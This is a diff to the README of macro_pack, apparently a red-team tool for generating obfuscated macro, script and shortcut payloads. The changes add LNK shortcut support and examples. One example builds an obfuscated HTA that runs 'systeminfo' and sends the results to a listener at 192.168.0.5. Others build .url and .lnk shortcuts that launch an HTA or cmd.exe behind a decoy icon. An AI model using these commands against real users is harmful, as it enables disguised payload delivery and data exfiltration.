@@ -61,13 +61,13 @@ Scripting (txt) supported formats are:
 * Windows Script Components scriptlets (.wsc, .sct)
 * HTML Applications (.hta)
 
-
 Shortcuts supported formats are:
+* Shell Link (.lnk)
 * Explorer Command File (.scf)
 * URL Shortcut (.url)
 * Groove Shortcuts (.glk)
 
-Note that all scripting and shortcuts formats can be generated on Linux version of macro\_pack as well.
+Note that all scripting and shortcuts formats (except LNK) can be generated on Linux version of macro\_pack as well.
 
 
 
@@ -198,7 +198,7 @@ set EnableStageEncoding true
  ```
 
 
-- Generated obfuscated HTA file which executes "systeminfo" and returns result to another macro_pack listening on 192.168.0.5
+- Generates obfuscated HTA file which executes "systeminfo" and returns result to another macro_pack listening on 192.168.0.5
 ```batch
 # 1 Generate HTA file with CMD template
 echo http://192.168.0.5:1234/a "systeminfo" | macro_pack.exe -t CMD -o -G info.hta
@@ -211,7 +211,13 @@ mshta.exe full/path/to/info.hta
 
 - Generate url shortcut which executes a local hta file when you click on it
 ```batch
- echo "file://C:\Users\username\Desktop\hello.hta" | python.exe .\macro_pack.py -G C:\Users\username\Desktop\yop.url
+ echo "file://C:\Users\username\Desktop\hello.hta" | macro_pack.exe -G yop.url
+```
+
+
+- Generate lnk shortcut which executes a cmd running calc.exe with calc.exe icon
+```batch
+ echo '"c:\Windows\System32\cmd.exe /c calc.exe" "calc.exe"' | macro_pack.exe -G calc.lnk
 ```
 
 
